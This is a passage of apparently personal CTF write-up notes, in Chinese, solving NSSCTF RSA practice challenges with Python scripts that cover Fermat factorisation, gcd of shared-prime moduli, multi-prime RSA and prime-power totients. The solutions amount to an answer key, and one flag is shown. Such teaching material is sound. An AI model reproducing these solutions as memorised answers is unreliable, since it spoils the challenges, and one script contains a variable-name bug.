class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><hr /><h2 id="rsa1p5">[RSA1]P5</h2><h3 id="main_py-3">main_py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br>flag = <span class="hljs-string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span><br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = gmpy2.next_prime(p - getPrime(<span class="hljs-number">256</span>))<br>n = p*q<br>e = <span class="hljs-number">65537</span><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>m = bytes_to_long(flag)<br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n = <span class="hljs-subst">&#123;n&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;e = <span class="hljs-subst">&#123;e&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 148841588941490812589697505975986386226158446072049530534135525236572105309550985274214825612079495930267744452266230141871521931612761645600600201983605957650711248808703757693378777706453580124982526368706977258199152469200838211055230241296139605912607613807871432800586045262879581100319519318390454452117</span><br><span class="hljs-string">e = 65537</span><br><span class="hljs-string">c = 69038543593219231496623016705860610154255535760819426453485115089535439537440188692852514795648297200067103841434646958466720891016026061658602312900242658759575613625726750416539176437174502082858413122020981274672260498423684555063381678387696096811975800995242962853092582362805345713900308205654744774932</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="decrypt1.py">decrypt1.py</h3><p><strong>已知n,e,c，且p,q相差不大（经典款）。</strong></p><p>直接yafu分解：</p><p>但是不能用[RSA1]P4里面的方法，因为根号n的下一个素数不一定是q哦😡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>P = <span class="hljs-number">12200065120379104459630695224710181907653841921369674962900093531339421658815375891425102591939094029941691738405035324548070063226677838530633694428729829</span><br>q = <span class="hljs-number">12200065120379104459630695224710181907653841921369674962900093531339421658815305905822146210878434959851438079877557401145694064756239882458467901042367473</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">69038543593219231496623016705860610154255535760819426453485115089535439537440188692852514795648297200067103841434646958466720891016026061658602312900242658759575613625726750416539176437174502082858413122020981274672260498423684555063381678387696096811975800995242962853092582362805345713900308205654744774932</span><br><br>n = p * q<br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><br>d = <span class="hljs-built_in">pow</span>(e,-<span class="hljs-number">1</span>,phi)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><br><span class="hljs-built_in">print</span>(long_to_bytes(m))   <br></code></pre></td></tr></table></figure><p>文章 - <a href="https://www.nssctf.cn/note/set/3025">RSA1]P5pepper的WriteUp | NSSCTF</a></p><h3 id="decrypt2.py">decrypt2.py</h3><p><strong>已知n,e,c，且p,q相差不大（经典款）。</strong></p><p>费马分解： <a href="https://www.nssctf.cn/note/set/3025">RSA1]P5pepper的WriteUp | NSSCTF</a></p><p>看懂了，只有一个问题：为什么从a从根号n开始加</p><ul><li>因为b要从0，a等于根号n时b才等于0😋</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br>p = getPrime(<span class="hljs-number">512</span>)<br>q = gmpy2.next_prime(p - getPrime(<span class="hljs-number">256</span>))<br><br>n = <span class="hljs-number">148841588941490812589697505975986386226158446072049530534135525236572105309550985274214825612079495930267744452266230141871521931612761645600600201983605957650711248808703757693378777706453580124982526368706977258199152469200838211055230241296139605912607613807871432800586045262879581100319519318390454452117</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">69038543593219231496623016705860610154255535760819426453485115089535439537440188692852514795648297200067103841434646958466720891016026061658602312900242658759575613625726750416539176437174502082858413122020981274672260498423684555063381678387696096811975800995242962853092582362805345713900308205654744774932</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fermat_attack</span>(<span class="hljs-params">n</span>):<br>    a = isqrt(n)<br>    b2 = a*a - n<br>    b = isqrt(n)    <span class="hljs-comment">#这里只是对b进行一个初始化，b=1，2，3，，，等于几应该都行</span><br>    count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> b*b != b2:          <br>        a = a + <span class="hljs-number">1</span><br>        b2 = a*a - n<br>        b = isqrt(b2)<br>        count += <span class="hljs-number">1</span><br>    p = a+b<br>    q = a-b<br>    <span class="hljs-keyword">assert</span> n == p * q<br>    <span class="hljs-keyword">return</span> p, q<br><br><br>p, q = fermat_attack(n)<br><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = invert(e, phi)<br><br><br>msg = <span class="hljs-built_in">pow</span>(c, d, n)<br>message = long_to_bytes(msg)<br><br><span class="hljs-built_in">print</span>(message)<br></code></pre></td></tr></table></figure><hr /><h2 id="rsa1p6">[RSA1]P6</h2><h3 id="main_py-4">main_py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>flag = <span class="hljs-string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span><br><br>p1 = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>p2 = getPrime(<span class="hljs-number">512</span>)<br><br>n1 = p1*q<br>n2 = p2*q<br><br>e = <span class="hljs-number">65537</span><br><br>m = bytes_to_long(flag)<br>c1 = <span class="hljs-built_in">pow</span>(m, e, n1)<br>c2 = <span class="hljs-built_in">pow</span>(m, e, n2)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n1 = <span class="hljs-subst">&#123;n1&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n2 = <span class="hljs-subst">&#123;n2&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;e = <span class="hljs-subst">&#123;e&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c1 = <span class="hljs-subst">&#123;c1&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c2 = <span class="hljs-subst">&#123;c2&#125;</span>&#x27;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n1 = 143348646254804947818644803938588739009782265465565896704788366218178523508874903492905378927641178487821742289009401873633609987818871281146199303052141439575438691652893995423962176259643151111739185844059243400387734688275416379337335777994990138009973618431459431410429980866760075387393812720247541406893</span><br><span class="hljs-string">n2 = 138110854441015362783564250048191029327770295545362614687087481715680856350219966472039006526758450117969049316234863489558254565946242898336924686721846675826468588471046162610143748100096038583426519355288325214365299329095841907207926280081868726568947436076663762493891291276498567791697978693639037765169</span><br><span class="hljs-string">e = 65537</span><br><span class="hljs-string">c1 = 54957154834913405861345262613986460384513988240935244315981524013378872930144117440787175357956479768211180412158274730449811947349624843965933828130932856052315165316154486515277625404352272475136003785605985702495858150662789554694910771308456687676791434476722168247882078861234982509648037033827107552029</span><br><span class="hljs-string">c2 = 122221335585005390437769701090707585780333874638519916373585594040154234166935881089609641995190534396533473702495240511296379249872039728112248708182969185010334637138777948970821974238214641235158623707766980447918480715835847907220219601467702961667091318910582445444058108454023108157805147341928089334736</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="decrypt.py-4">decrypt.py</h3><p><strong>已知（e,n1,c1,n2,c1），求m</strong></p><p><strong>两组数中e相同，n,c不同，n1和n2的最大公因数即为p,之后就能求出q、d,继而求出m</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>n1 = <span class="hljs-number">143348646254804947818644803938588739009782265465565896704788366218178523508874903492905378927641178487821742289009401873633609987818871281146199303052141439575438691652893995423962176259643151111739185844059243400387734688275416379337335777994990138009973618431459431410429980866760075387393812720247541406893</span><br>n2 = <span class="hljs-number">138110854441015362783564250048191029327770295545362614687087481715680856350219966472039006526758450117969049316234863489558254565946242898336924686721846675826468588471046162610143748100096038583426519355288325214365299329095841907207926280081868726568947436076663762493891291276498567791697978693639037765169</span><br>e = <span class="hljs-number">65537</span><br>c1 = <span class="hljs-number">54957154834913405861345262613986460384513988240935244315981524013378872930144117440787175357956479768211180412158274730449811947349624843965933828130932856052315165316154486515277625404352272475136003785605985702495858150662789554694910771308456687676791434476722168247882078861234982509648037033827107552029</span><br>c2 = <span class="hljs-number">122221335585005390437769701090707585780333874638519916373585594040154234166935881089609641995190534396533473702495240511296379249872039728112248708182969185010334637138777948970821974238214641235158623707766980447918480715835847907220219601467702961667091318910582445444058108454023108157805147341928089334736</span><br><br><span class="hljs-comment"># p1 = getPrime(512)</span><br><span class="hljs-comment"># q = getPrime(512)</span><br><span class="hljs-comment"># p2 = getPrime(512)            byd你写解代码的时候加上这一段干什么</span><br><br><span class="hljs-comment"># n1 = p1*q</span><br><span class="hljs-comment"># n2 = p2*q</span><br><br>q = gcd(n1,n2)        <span class="hljs-comment"># 最关键的一句，看出q是n1和n2的最大公因数，然后求出q，后面就常规</span><br><span class="hljs-comment"># print(q)</span><br>p1 = n1 // q<br><br>phi = (q-<span class="hljs-number">1</span>)*(p1-<span class="hljs-number">1</span>)<br>d1 = invert(e, phi) <br><br>m1 = <span class="hljs-built_in">pow</span>(c1, d1, n1)<br><br><br><span class="hljs-comment"># m1=hex(m1).replace(&#x27;0x&#x27;,&#x27;&#x27;)</span><br><span class="hljs-comment"># flag = bytes.fromhex(m1)</span><br><span class="hljs-comment"># print(flag)</span><br><br><span class="hljs-built_in">print</span>(long_to_bytes(m1))<br><span class="hljs-comment"># 但是有个小问题啊，为什么n1和n2解出来是一样的捏🤒</span><br></code></pre></td></tr></table></figure><hr /><h2 id="rsa1p7">[RSA1]P7</h2><h3 id="main_py-5">main_py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span> + <span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">170</span><br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>r = getPrime(<span class="hljs-number">512</span>)<br>n = p*q*r<br>e = <span class="hljs-number">65537</span><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)*(r-<span class="hljs-number">1</span>)<br><br>m = bytes_to_long(flag)<br><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;p = <span class="hljs-subst">&#123;p&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;q = <span class="hljs-subst">&#123;q&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;r = <span class="hljs-subst">&#123;r&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;e = <span class="hljs-subst">&#123;e&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">p = 10666139331774428325755287635566473140804481321882464031499529816800186578792308674238646794969384836340484775213796013129603472328582005363876462361316357</span><br><span class="hljs-string">q = 8419311673449738061914489023962717718536471719688567807316495262754711350004888752049108347226115000749280146228195893953964759818878155006622123533942989</span><br><span class="hljs-string">r = 12875078327453384158245832541544758526474680184252540739652077682353277702054275525591573258723948221345537075374635382175740236093131628077747126356403959</span><br><span class="hljs-string">e = 65537</span><br><span class="hljs-string">c = 424552463648937499189041230155623101311087334789253159440707211761796081289342164253743235182597460622581134089949035117444838205449163269030784233435435681797627188717450074808905561404960693227573181548281296514743775615606388692910356320667720308219275107443303501165027740512539959960217657836317351146520079753390346207659007421416917274795119021374032194294225350901136669304225010974617136606299060486198480556729770211945777266366417547752798441211059402</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="decrypt.py-5">decrypt.py</h3><p><strong>已知（e，p，q，r），求m（特例款）</strong></p><p>相当于多了一个参数r，还是一样，加上r就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>p = <span class="hljs-number">10666139331774428325755287635566473140804481321882464031499529816800186578792308674238646794969384836340484775213796013129603472328582005363876462361316357</span><br>q = <span class="hljs-number">8419311673449738061914489023962717718536471719688567807316495262754711350004888752049108347226115000749280146228195893953964759818878155006622123533942989</span><br>r = <span class="hljs-number">12875078327453384158245832541544758526474680184252540739652077682353277702054275525591573258723948221345537075374635382175740236093131628077747126356403959</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">424552463648937499189041230155623101311087334789253159440707211761796081289342164253743235182597460622581134089949035117444838205449163269030784233435435681797627188717450074808905561404960693227573181548281296514743775615606388692910356320667720308219275107443303501165027740512539959960217657836317351146520079753390346207659007421416917274795119021374032194294225350901136669304225010974617136606299060486198480556729770211945777266366417547752798441211059402</span><br><br>n = p * q * r<br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)*(r-<span class="hljs-number">1</span>)<br><br>d = <span class="hljs-built_in">pow</span>(e,-<span class="hljs-number">1</span>,phi)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><br><span class="hljs-built_in">print</span>(long_to_bytes(m))  <br><br><span class="hljs-comment">#b&#x27;NSSCTF&#123;3th_number!&#125;11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111&#x27;</span><br><span class="hljs-comment"># 不过至于本题为何要添加上大量的字符1作为填充内容，这个问题待到P9时我们便会知晓。</span><br></code></pre></td></tr></table></figure><hr /><h2 id="rsa1p8">[RSA1]P8</h2><h3 id="main_py-6">main_py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span> + <span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">100</span><br><br>p = getPrime(<span class="hljs-number">256</span>)<br>q = getPrime(<span class="hljs-number">256</span>)<br>n = (p**<span class="hljs-number">3</span>) * q<br>e = <span class="hljs-number">65537</span><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><br>m = bytes_to_long(flag)<br><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;p = <span class="hljs-subst">&#123;p&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;q = <span class="hljs-subst">&#123;q&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;e = <span class="hljs-subst">&#123;e&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">p = 80505091208742938705306670241621545375764148093711243653439069254008824979403</span><br><span class="hljs-string">q = 67599990875658931406915486208971556223245451500927259766683936131876689508521</span><br><span class="hljs-string">e = 65537</span><br><span class="hljs-string">c = 7958690969908064264211283192959937430539613460471121984649054121171267262097603091410178042319139582772142226087020110084551158367679146616732446561228522673699836019156243452069036383047309578614662564794584927846163157472211089368697387945469398750955336949678910159585015004994620777231073804301249774041</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="decrypt.py-6">decrypt.py</h3><p><strong>已知（e，p，q，r），求m（经典款）</strong></p><p>byd欧拉公式都不知道是吧：</p><p>对于： <span class="math display">\[n = p_{1}^{k_{1}}p_{2}^{k_{2}}p_{3}^{k_{3}}\cdots p_{r}^{k_{r}}\]</span></p><p>欧拉函数等于：</p><p><span class="math display">\[\varphi (n) = \prod_{i=1}^{r} p_{i}^{k_{i}-1}(p_{i}-1)\]</span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>p = <span class="hljs-number">80505091208742938705306670241621545375764148093711243653439069254008824979403</span><br>q = <span class="hljs-number">67599990875658931406915486208971556223245451500927259766683936131876689508521</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">7958690969908064264211283192959937430539613460471121984649054121171267262097603091410178042319139582772142226087020110084551158367679146616732446561228522673699836019156243452069036383047309578614662564794584927846163157472211089368697387945469398750955336949678910159585015004994620777231073804301249774041</span><br><br>n = p * p * p * q<br>phi = (p**<span class="hljs-number">2</span>)*(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><br>d = <span class="hljs-built_in">pow</span>(e,-<span class="hljs-number">1</span>,phi)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><br><span class="hljs-built_in">print</span>(long_to_bytes(m))  <br><br></code></pre></td></tr></table></figure><hr /><h2 id="rsa1p9">[RSA1]P9</h2><h3 id="main_py-7">main_py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span><br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br><br>e = <span class="hljs-number">65537</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    r = <span class="hljs-number">2</span>*getPrime(<span class="hljs-number">100</span>)*e+<span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> isPrime(r):<br>        <span class="hljs-keyword">break</span><br><br>n = p*q*r<br><br>m = bytes_to_long(flag)<br><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;p = <span class="hljs-subst">&#123;p&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;q = <span class="hljs-subst">&#123;q&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;r = <span class="hljs-subst">&#123;r&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;e = <span class="hljs-subst">&#123;e&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">p = 7478755670255767435237487693415479182290330775502792675052667363676831056436638619069277770540533350723045234676443621124912287506103439704868369839725279</span><br><span class="hljs-string">q = 9232828888049557325429111621080998490274442347556398052322580869768941301413255711626092627273543579067597113958627672298942570149816938335701615759283713</span><br><span class="hljs-string">r = 102909133680612532601801231903654039</span><br><span class="hljs-string">e = 65537</span><br><span class="hljs-string">c = 142893174944324070830219394465469685943669308818639857030565389839224452373848570577201378981080333784852764502832587008270072323948511579823852437852643609820245476634896477031076952735298279618952398460203032125853063235638358942643559551563899381032067185778629120272032518475352761100115057449043142848203976076694124978394099839339406197</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="decrypt.py-7">decrypt.py</h3><p><strong>已知（e，p，q，r)，且m已知很短</strong></p><p>总结：</p><p>满足以下情况时，可以不使用题中给的n=pqr计算公式，自己重新计算n，再进一步计算公私钥：</p><ol type="1"><li>明文m比较简短<ul><li>flag = b’NSSCTF{ <span class="math inline">\(\cdots\cdots\)</span>}’+ b’1’ * 100 不行</li><li>flag = b’NSSCTF{ <span class="math inline">\(\cdots \cdots\)</span>}’ 可以</li></ul></li><li>分析发现使用给定的n无法计算d，原因可能是d = inverse(e,phi)中e、phi不互素</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br><br>p = <span class="hljs-number">7478755670255767435237487693415479182290330775502792675052667363676831056436638619069277770540533350723045234676443621124912287506103439704868369839725279</span><br>q = <span class="hljs-number">9232828888049557325429111621080998490274442347556398052322580869768941301413255711626092627273543579067597113958627672298942570149816938335701615759283713</span><br>r = <span class="hljs-number">102909133680612532601801231903654039</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">142893174944324070830219394465469685943669308818639857030565389839224452373848570577201378981080333784852764502832587008270072323948511579823852437852643609820245476634896477031076952735298279618952398460203032125853063235638358942643559551563899381032067185778629120272032518475352761100115057449043142848203976076694124978394099839339406197</span><br><br>n = p * q    <span class="hljs-comment"># 相当于直接把r给忽略掉了，但原理还没懂，xenny师傅的wp有点没看懂</span><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><br>d = invert(e, phi)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><br><span class="hljs-built_in">print</span>(long_to_bytes(m))   <br></code></pre></td></tr></table></figure><p>Xenny师傅的wp：<ahref="https://www.nssctf.cn/problem/sheet/7142">Crypto系列——RSA（一） |NSSCTF</a></p><hr /><h2 id="rsa1p10">[RSA1]P10</h2><h3 id="main_py-8">main_py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span><br><br>p = 